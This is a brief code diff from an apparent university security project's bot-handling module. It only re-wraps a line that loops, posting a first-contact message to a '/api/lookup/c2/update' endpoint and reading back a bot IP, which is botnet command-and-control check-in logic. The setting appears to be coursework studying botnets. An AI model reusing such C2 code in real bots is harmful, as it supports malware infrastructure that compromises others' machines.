@@ -91,7 +91,8 @@ namespace Coms4507_Project.BotHandling
             {
                 while(true)
                 {
-                    Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", new StringContent(firstContact.ToString()));
+                    Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", 
+                        new StringContent(firstContact.ToString()));
                     response.Wait();
                     string botIP = response.Result.Content.ReadAsStringAsync().Result;
                     Trace.WriteLine(botIP);
